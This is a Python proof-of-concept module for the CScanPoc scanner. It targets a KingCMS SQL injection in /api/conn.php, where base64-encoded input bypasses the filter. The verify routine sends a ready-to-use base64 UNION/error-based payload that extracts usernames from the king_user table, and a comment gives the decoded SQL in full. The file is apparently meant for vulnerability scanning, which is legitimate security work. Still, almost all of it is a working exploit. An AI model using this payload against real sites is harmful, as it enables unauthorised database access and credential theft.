# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'KingCMS_0001'  # 平台漏洞编号，留空
    name = 'KingCMS 绕过过滤SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-11'  # 漏洞公布时间
    desc = '''
        /api/conn.php?USERID=MTAwMDA%3D&data=
        这个注入点比较奇怪，因为数据库执行的语句全部都由用户输入，虽然有注入过滤，但是base64_decode后轻松绕过了。
        注入参数：data_one,data,count,newid,getdir,getfile
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3486/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KingCMS'  # 漏洞应用名称
    product_version = '<9.00.0015版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7705336b-9c65-45e6-92e9-f36edf360957'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # SELECT mid,mname,mtable FROM king_content_model UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,md5(c))FROM king_user LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a
            payload = "/api/conn.php?USERID=MTAwMDA%3D&data=U0VMRUNUIG1pZCxtbmFtZSxtdGFibGUgRlJPTSBraW5nX2NvbnRlbnRfbW9kZWwgVU5JT04gU0VMRUNUIDEgRlJPTShTRUxFQ1QgQ09VTlQoKiksQ09OQ0FUKDB4MjMsKFNFTEVDVCBjb25jYXQodXNlcm5hbWUsMHgyMyxtZDUoYykpRlJPTSBraW5nX3VzZXIgTElNSVQgMCwxKSwweDIzLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS50YWJsZXMgR1JPVVAgQlkgeClh&jsoncallback=jsonp1426001109856&SIGN=9e64da1bfad93ed03ac42e0522cad92d&_=1426001137223"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
